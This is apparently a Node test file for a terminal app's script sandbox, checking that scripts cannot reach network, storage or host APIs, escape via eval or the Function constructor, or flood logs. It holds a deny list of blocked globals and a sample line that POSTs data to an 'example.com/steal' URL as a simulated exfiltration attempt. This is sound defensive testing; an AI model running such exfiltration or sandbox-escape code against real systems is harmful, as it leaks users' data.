import assert from "node:assert/strict";
import test from "node:test";
import {
  SCRIPT_RUN_STATUS,
  runScript,
  scriptRuns,
  stopScript,
} from "../src/services/scripting/scriptRunner.js";
import { publishTerminalOutput, registerScriptBridge } from "../src/services/scripting/bridges.js";

const TARGET = "sandbox-session";

function createFakeBridge() {
  const listeners = new Set();
  return {
    sent: [],
    bufferText: "",
    send(data) {
      this.sent.push(data);
      return true;
    },
    getScreenText: () => "",
    getBufferText() {
      return this.bufferText;
    },
    notifyOutput(data) {
      for (const listener of [...listeners]) listener(data);
    },
    onOutput(listener) {
      listeners.add(listener);
      return () => listeners.delete(listener);
    },
  };
}

let unregister = null;

function setup() {
  unregister = registerScriptBridge(TARGET, createFakeBridge());
}

function teardown() {
  unregister?.();
  unregister = null;
}

function testContext() {
  return { targetSessionId: TARGET, targetLabel: "Sandbox" };
}

// 访问被禁全局的任何属性/调用都应让脚本以"沙盒禁用"错误结束。
const BLOCKED_GLOBALS = [
  "fetch",
  "XMLHttpRequest",
  "WebSocket",
  "EventSource",
  "Worker",
  "BroadcastChannel",
  "importScripts",
  "__TAURI__",
  "__TAURI_INTERNALS__",
  "__TAURI_METADATA__",
  "window",
  "self",
  "globalThis",
  "document",
  "top",
  "parent",
  "frames",
  "opener",
  "location",
  "history",
  "navigator",
  "screen",
  "localStorage",
  "sessionStorage",
  "indexedDB",
  "caches",
  "Function",
  "require",
  "module",
  "process",
  "alert",
  "confirm",
  "prompt",
  "open",
  "close",
  "postMessage",
  "Notification",
  "SharedArrayBuffer",
];

test("sandboxed globals throw a naming error on any access", async () => {
  setup();
  for (const name of BLOCKED_GLOBALS) {
    const run = await runScript(
      {
        id: `blocked-${name}`,
        name: `blocked-${name}`,
        code: `void (${name}).anything;`,
      },
      testContext(),
    );
    assert.equal(run.status, SCRIPT_RUN_STATUS.ERROR, `${name} should be blocked`);
    assert.match(run.error, /沙盒|sandbox/i, `${name} error should mention the sandbox`);
    assert.ok(run.error.includes(name), `${name} error should name the blocked api`);
  }
  teardown();
});

test("calling a blocked global also throws (not just property access)", async () => {
  setup();
  const run = await runScript(
    {
      id: "blocked-call",
      name: "blocked-call",
      code: `await fetch("https://example.com/steal", { method: "POST", body: "x" });`,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.ERROR);
  assert.match(run.error, /沙盒|sandbox/i);
  assert.ok(run.error.includes("fetch"));
});

test("blocked globals cannot be replaced by local declarations", async () => {
  setup();
  const run = await runScript(
    {
      id: "blocked-shadow",
      name: "blocked-shadow",
      code: `const fetch = () => "escaped";`,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.ERROR);
  assert.match(run.error, /fetch|already been declared|Identifier/);
});

test("direct eval still resolves globals through the sandbox scope", async () => {
  setup();
  const run = await runScript(
    {
      id: "blocked-direct-eval",
      name: "blocked-direct-eval",
      // 直接 eval 继承当前作用域：fetch 依旧命中沙盒屏蔽值。
      code: `eval("fetch('/x')");`,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.ERROR);
  assert.match(run.error, /沙盒|sandbox/i);
});

test("new Function() code generation is blocked", async () => {
  setup();
  const run = await runScript(
    {
      id: "blocked-function-ctor",
      name: "blocked-function-ctor",
      code: `new Function("return 1")();`,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.ERROR);
  assert.match(run.error, /沙盒|sandbox/i);
});

test("safe standard globals remain available inside the sandbox", async () => {
  setup();
  const run = await runScript(
    {
      id: "sandbox-allowed",
      name: "sandbox-allowed",
      code: `
        const url = new URL("https://example.com/a?b=1");
        const text = new TextDecoder().decode(new TextEncoder().encode("héllo"));
        xterm.log(url.searchParams.get("b"), text, atob("aGk="), structuredClone({ ok: 1 }).ok);
        xterm.log(typeof JSON, typeof Math, typeof Promise, typeof Map, typeof crypto?.getRandomValues === "undefined" ? "skip" : "crypto");
      `,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.DONE);
  assert.equal(run.logs[0].text, "1 héllo hi 1");
});

test("console/timers provided by the runtime are not shadowed by the sandbox", async () => {
  setup();
  const run = await runScript(
    {
      id: "sandbox-runtime-scope",
      name: "sandbox-runtime-scope",
      code: `
        console.log("via-console");
        await new Promise((resolve) => setTimeout(resolve, 5));
        xterm.log("timers-ok");
      `,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.DONE);
  assert.equal(run.logs[0].text, "via-console");
  assert.equal(run.logs[1].text, "timers-ok");
});

test("natural async functions finish after their promise and timer continuations", async () => {
  setup();
  const run = await runScript(
    {
      id: "natural-async",
      name: "natural-async",
      code: `
        async function collect() {
          const values = await new Promise((resolve) => {
            setTimeout(() => resolve([1, 2, 3]), 5);
          });
          xterm.log(values.map((value) => value * 2).join(","));
        }
        collect();
      `,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.DONE);
  assert.equal(run.logs[0].text, "2,4,6");
});

test("promise chains keep unresolved continuations alive until stopped", async () => {
  setup();
  const runPromise = runScript(
    {
      id: "promise-chain-pending",
      name: "promise-chain-pending",
      code: `Promise.resolve().then(() => ({ then() {} }));`,
    },
    testContext(),
  );
  await new Promise((resolve) => setTimeout(resolve, 20));
  const run = scriptRuns.value[0];
  assert.equal(run.status, SCRIPT_RUN_STATUS.RUNNING);
  assert.equal(stopScript(run.runId), true);
  const stopped = await runPromise;
  teardown();
  assert.equal(stopped.status, SCRIPT_RUN_STATUS.STOPPED);
});

test("script declarations can shadow runtime names without parameter collisions", async () => {
  setup();
  const run = await runScript(
    {
      id: "shadow-runtime",
      name: "shadow-runtime",
      code: `
        const console = { log: (value) => xterm.log("local", value) };
        console.log("console");
        const setTimeout = (callback) => callback();
        setTimeout(() => xterm.log("timer-shadow"));
      `,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.DONE);
  assert.deepEqual(
    run.logs.map((entry) => entry.text),
    ["local console", "timer-shadow"],
  );
});

test("oversized log arguments are truncated instead of stored whole", async () => {
  setup();
  const run = await runScript(
    {
      id: "log-truncation",
      name: "log-truncation",
      code: `xterm.log("x".repeat(64 * 1024));`,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.DONE);
  assert.ok(run.logs[0].text.length <= 8 * 1024 + 1);
  assert.ok(run.logs[0].text.endsWith("…"));
});

test("log truncation keeps surrogate pairs well-formed", async () => {
  setup();
  const run = await runScript(
    {
      id: "log-grapheme-truncation",
      name: "log-grapheme-truncation",
      code: `xterm.log("x".repeat(8191) + "🙂" + "tail");`,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.DONE);
  assert.equal(run.logs[0].text.isWellFormed(), true);
  assert.equal(run.logs[0].text, `${"x".repeat(8191)}…`);
});

test("high-frequency script logs are token-bucket limited with a summary", async () => {
  setup();
  const run = await runScript(
    {
      id: "log-rate-limit",
      name: "log-rate-limit",
      code: `for (let index = 0; index < 400; index += 1) xterm.log(index);`,
    },
    testContext(),
  );
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.DONE);
  assert.ok(run.logs.some((entry) => /丢弃|dropped/.test(entry.text)));
  assert.ok(run.logs.length < 400);
});

test("terminal interaction still works under the sandbox", async () => {
  setup();
  const runPromise = runScript(
    {
      id: "sandbox-terminal",
      name: "sandbox-terminal",
      code: `
        await xterm.sendLine("show version");
        const matched = await xterm.waitFor("Version 1.0", 2000);
        xterm.log("matched", matched);
      `,
    },
    testContext(),
  );
  await new Promise((resolve) => setTimeout(resolve, 20));
  publishTerminalOutput(TARGET, "Software Version 1.0\r\n");
  const run = await runPromise;
  teardown();
  assert.equal(run.status, SCRIPT_RUN_STATUS.DONE);
  assert.equal(run.logs[0].text, "matched Version 1.0");
});
